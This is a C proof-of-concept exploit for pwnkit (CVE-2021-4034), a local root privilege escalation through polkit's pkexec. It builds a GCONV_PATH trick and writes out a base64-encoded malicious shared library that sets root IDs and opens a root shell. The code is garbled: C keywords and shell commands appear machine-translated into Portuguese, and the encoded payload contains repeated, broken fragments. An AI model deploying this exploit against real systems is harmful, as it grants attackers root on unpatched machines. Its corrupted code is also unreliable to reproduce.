#incluir <stdio.h>
#incluir <stdlib.h>
#incluem <unistd.h>

int principal(){
	printf("prova de conceito pwnkit (CVE-2021-4034)\n");
	system("mkdir 'GCONV_PATH=.'; toque em 'GCONV_PATH=./tmp'; chmod +x 'GCONV_PATH=./tmp'");
	system("mkdir tmp;echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCnZvaWQgZ2NvbnYoKSB7fQoKdm9pZCBnY29udl9pbml0KCkgewogIHB1dHMoInB3bmVkIik7CiAgc2V0dWlkdaKpOwogIHpOwogIHB1dHMoInB3bmVkIik7CiAgc2V0dWlkdaKpOwogIHpOwogIHB1dHMoInB3bmVkIik7CiAgc2V0dWlkdaKpOwogIHNldGdpZCgwKTsKICBzZXRldWlkKDApOwogIHNldGVnaWQoMCk7ICAKc3lzdGVtKCIvdXNyL2Jpbi9zdWRvIC11IHJvb3QgLWkgL2Jpbi9iYXNoIik7CiAgZXhpdCgwKTsKfQo= | base64 -d > tmp/payload.c; gcc tmp/payload.c -o tmp/pwnkit.so -shared -fPIC ");
	system("echo bW9kdWxlIFVURi04Ly8gUFdOS0lULy8gcHdua2l0IDIK | base64 -d > tmp/gconv-modules");
	char* pkexec_path = "/usr/bin/pkexec";
	char* null_args[] = {NULL};
	char* pkexec_env[] = {"tmp", "CHARSET=PWNKIT", "SHELL=aa", "PATH=GCONV_PATH=.", "GIO_USE_VFS=",NULL};
	execve(pkexec_path, null_args, pkexec_env);
}
